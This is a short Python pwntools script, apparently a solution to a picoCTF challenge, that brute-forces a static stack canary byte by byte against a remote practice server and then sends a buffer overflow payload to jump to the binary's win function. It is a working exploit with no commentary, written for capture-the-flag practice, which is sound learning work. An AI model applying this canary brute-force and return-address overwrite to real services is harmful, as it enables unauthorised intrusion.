#!/bin/python3

from pwn import *

elf= context.binary= ELF('vuln')


canary= b""

for i in range(1, 5):
    
    for can in string.printable:

        io= remote('saturn.picoctf.net', 64458)
        io.sendlineafter(b"> ", b"%d" % (64+i))

        payload= b"A"*64 + canary
        payload += can.encode()

        io.sendlineafter(b"> ", payload)

        output= io.recvall()
        print(output)

        if b"Now Where's the Flag" in output:
            canary += can.encode()

            break

        io.close()

print(canary)

payload = b"A"*64
payload += canary
payload += b"A"*16
payload += p32(elf.sym.win)

io= remote('saturn.picoctf.net', 64458)

io.sendlineafter(b"> ", b"%d"%(len(payload)))
io.sendlineafter(b"> ", payload)

output= io.recvall()
print(output)

io.close()
